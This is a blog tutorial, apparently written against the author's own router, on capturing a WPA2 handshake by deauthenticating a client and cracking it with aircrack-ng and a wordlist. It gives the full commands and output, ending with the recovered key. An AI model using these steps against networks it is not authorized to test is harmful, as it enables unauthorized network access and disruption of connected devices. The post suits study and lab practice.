---
layout: post
title: Wifi Hacking Part 1
subtitle: Deauthentication & WPA Handshake Cracking
tags: [WIFI]
---

# Wifi Hacking Part 1

## WPA Handshake

A WPA handshake is a series of frames that are sent between a AP and a client to authenticate the client. These frame have the ability to be cracked using various tools. Once these frames are crack the WIFI password can be obtained for that network. I ran  `sudo airmon-ng start INTERFACE` before starting this attack chain

### Handshake Capture With De-Auth
One way to capture a WPA handshake is to DeAuth an already connected client. In the snip below I ran `airodump-ng` to target the bssid of my router `--bssid`, on channel 1 `-c 1`, and wrote it to a file called zon.cap `-w zon.cap`. The output shows that there is one client connected to the Zon AP and is sending frames.

```
sudo airodump-ng wlan0mon --bssid 30:46:9A:A6:34:76 -c 1 -w zon.cap

CH  1 ][ Elapsed: 2 mins ][ 2023-04-28 21:45 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:46:9A:A6:34:76  -16 100     1357     1511    0   1  130   WPA2 CCMP   PSK  Zon                                                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 30:46:9A:A6:34:76  FC:77:74:8E:3F:B4  -26   24e- 6e     0     1622  PMKID
```

One option to get the WPA handshake would be to wait until the client disconnects and then reconnects. This could happen if the devices leaves the AP's range and then comes back into its range, or the device reboot's, or really anything that could cause a WPA handshake. Another option is to us `aireplay-ng` and send some DeAuth frames to tell the AP to disconnect from the client. To do this, continue to run the  `airodump-ng` capture and send a DeAuth frame. In the snip below that is exactly what happens. Running `aireplay-ng` sends a DeAuth frame with `-0 1` to my access point `-a 30:46:9A:A6:34:76`, with the connected host `-c FC:77:74:8E:3F:B4` on the wlan0mon interface.

```
┌──(zonifer㉿linux)-[~]
└─$ sudo aireplay-ng -0 1 -a 30:46:9A:A6:34:76 -c FC:77:74:8E:3F:B4 wlan0mon
21:44:50  Waiting for beacon frame (BSSID: 30:46:9A:A6:34:76) on channel 1
21:44:50  Sending 64 directed DeAuth (code 7). STMAC: [FC:77:74:8E:3F:B4] [ 0|42 ACKs]
```

Back on the `airodump-ng` output up at the top `WPA handshake: 30:46:9A:A6:34:76 ` is new. Signifying that a new handshake has occurred. I have successfuly de-authenticated the host and when it tried to connect back captured the handshake.

```
CH  1 ][ Elapsed: 2 mins ][ 2023-04-28 21:45 ][ **WPA handshake: 30:46:9A:A6:34:76** 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:46:9A:A6:34:76  -16 100     1357     1511    0   1  130   WPA2 CCMP   PSK  Zon                                                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 30:46:9A:A6:34:76  FC:77:74:8E:3F:B4  -26   24e- 6e     0     1622  PMKID  
```

Sticking with the `air` suite I'll use `aircrack-ng`, a custom word list `-w wordlist.txt` (a small rockyou), an essid of Zon `-e Zon`, a bssid of 30:46:9A:A6:34:76 `-b 30:46:9A:A6:34:76`, on the recent capture called zon.cap-01.cap `zon.cap-01.cap` In just a short amount of time this is cracked and the wifi password is found. 

```
sudo aircrack-ng -w wordlist.txt -e Zon -b 30:46:9A:A6:34:76 zon.cap-01.cap

                               Aircrack-ng 1.6 

      [00:00:00] 8/102 keys tested (100.82 k/s) 

      Time left: 0 seconds                                       7.84%

                           KEY FOUND! [ Zonifer1 ]


      Master Key     : 8C 29 D8 06 12 FE 70 86 7D 7E 48 6F 09 9C 6B BC 
                       14 11 C0 96 EE DA 4B FC B4 65 DA 6E AE 08 B5 FC 

      Transient Key  : 1D F2 27 91 A5 35 41 CE FD 8B 69 C5 26 75 3A 07 
                       2A 79 8E 77 0C 01 CB 20 29 FB 0B 1B C8 3A 42 96 
                       64 F1 16 2A 83 20 8F 75 63 A8 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : BB 06 27 45 F6 9E 24 3F 76 AF 24 93 6A 3C 61 51 
```
